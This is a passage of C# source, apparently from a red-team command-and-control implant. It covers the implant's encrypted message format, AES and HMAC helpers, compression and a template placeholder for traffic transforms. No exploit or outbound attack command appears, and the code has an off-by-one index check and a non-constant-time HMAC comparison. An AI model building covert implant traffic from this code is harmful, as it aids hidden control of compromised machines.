            if (parseList.Count < 5) { return null; }
            return new GruntEncryptedMessage
            {
                GUID = parseList[0],
                Type = (GruntEncryptedMessageType)int.Parse(parseList[1]),
                Meta = parseList[2],
                IV = parseList[3],
                EncryptedMessage = parseList[4],
                HMAC = parseList[5]
            };
        }

        public static string ToJson(GruntEncryptedMessage message)
        {
            return String.Format(
                GruntEncryptedMessageFormat,
                Utilities.JavaScriptStringEncode(message.GUID),
                message.Type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.Meta),
                Utilities.JavaScriptStringEncode(message.IV),
                Utilities.JavaScriptStringEncode(message.EncryptedMessage),
                Utilities.JavaScriptStringEncode(message.HMAC)
            );
        }
    }

    public static class Common
    {
        public static int AesIVLength = 16;
        public static CipherMode AesCipherMode = CipherMode.CBC;
        public static PaddingMode AesPaddingMode = PaddingMode.PKCS7;
        public static Encoding GruntEncoding = Encoding.UTF8;
    }

    public static class Utilities
    {
        // Returns IV (16 bytes) + EncryptedData byte array
        public static byte[] AesEncrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            SessionKey.Mode = Common.AesCipherMode;
            SessionKey.Padding = Common.AesPaddingMode;
            SessionKey.GenerateIV();
            SessionKey.Key = key;

            byte[] encrypted = SessionKey.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
            byte[] result = new byte[SessionKey.IV.Length + encrypted.Length];
            Buffer.BlockCopy(SessionKey.IV, 0, result, 0, SessionKey.IV.Length);
            Buffer.BlockCopy(encrypted, 0, result, SessionKey.IV.Length, encrypted.Length);
            return result;
        }

        // Data should be of format: IV (16 bytes) + EncryptedBytes
        public static byte[] AesDecrypt(byte[] data, byte[] key)
        {
            Aes SessionKey = Aes.Create();
            byte[] iv = new byte[Common.AesIVLength];
            Buffer.BlockCopy(data, 0, iv, 0, Common.AesIVLength);
            SessionKey.IV = iv;
            SessionKey.Key = key;
            byte[] encryptedData = new byte[data.Length - Common.AesIVLength];
            Buffer.BlockCopy(data, Common.AesIVLength, encryptedData, 0, data.Length - Common.AesIVLength);
            byte[] decrypted = SessionKey.CreateDecryptor().TransformFinalBlock(encryptedData, 0, encryptedData.Length);

            return decrypted;
        }

        // Convenience method for decrypting an EncryptedMessagePacket
        public static byte[] AesDecrypt(GruntEncryptedMessage encryptedMessage, byte[] key)
        {
            byte[] iv = Convert.FromBase64String(encryptedMessage.IV);
            byte[] encrypted = Convert.FromBase64String(encryptedMessage.EncryptedMessage);
            byte[] combined = new byte[iv.Length + encrypted.Length];
            Buffer.BlockCopy(iv, 0, combined, 0, iv.Length);
            Buffer.BlockCopy(encrypted, 0, combined, iv.Length, encrypted.Length);

            return AesDecrypt(combined, key);
        }

        public static byte[] ComputeHMAC(byte[] data, byte[] key)
        {
            HMACSHA256 SessionHmac = new HMACSHA256(key);
            return SessionHmac.ComputeHash(data);
        }

        public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)
        {
            HMACSHA256 hmac = new HMACSHA256(key);
            byte[] calculatedHash = hmac.ComputeHash(hashedBytes);
            // Should do double hmac?
            return Convert.ToBase64String(calculatedHash) == Convert.ToBase64String(hash);
        }

        public static byte[] Compress(byte[] bytes)
        {
            byte[] compressedBytes;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Compress))
                {
                    deflateStream.Write(bytes, 0, bytes.Length);
                }
                compressedBytes = memoryStream.ToArray();
            }
            return compressedBytes;
        }

        public static byte[] Decompress(byte[] compressed)
        {
            using (MemoryStream inputStream = new MemoryStream(compressed.Length))
            {
                inputStream.Write(compressed, 0, compressed.Length);
                inputStream.Seek(0, SeekOrigin.Begin);
                using (MemoryStream outputStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(inputStream, CompressionMode.Decompress))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = deflateStream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            outputStream.Write(buffer, 0, bytesRead);
                        }
                    }
                    return outputStream.ToArray();
                }
            }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
			if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
			if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
            return matches;
        }

        // Adapted from https://github.com/mono/mono/blob/master/mcs/class/System.Web/System.Web/HttpUtility.cs
        public static string JavaScriptStringEncode(string value)
        {
            if (String.IsNullOrEmpty(value)) { return String.Empty; }
            int len = value.Length;
            bool needEncode = false;
            char c;
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 31 || c == 34 || c == 39 || c == 60 || c == 62 || c == 92)
                {
                    needEncode = true;
                    break;
                }
            }
            if (!needEncode) { return value; }

            var sb = new StringBuilder();
            for (int i = 0; i < len; i++)
            {
                c = value[i];
                if (c >= 0 && c <= 7 || c == 11 || c >= 14 && c <= 31 || c == 39 || c == 60 || c == 62)
                {
                    sb.AppendFormat("\\u{0:x4}", (int)c);
                }
                else
                {
                    switch ((int)c)
                    {
                        case 8:
                            sb.Append("\\b");
                            break;
                        case 9:
                            sb.Append("\\t");
                            break;
                        case 10:
                            sb.Append("\\n");
                            break;
                        case 12:
                            sb.Append("\\f");
                            break;
                        case 13:
                            sb.Append("\\r");
                            break;
                        case 34:
                            sb.Append("\\\"");
                            break;
                        case 92:
                            sb.Append("\\\\");
                            break;
                        default:
                            sb.Append(c);
                            break;
                    }
                }
            }
            return sb.ToString();
        }

        // {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}
    }
}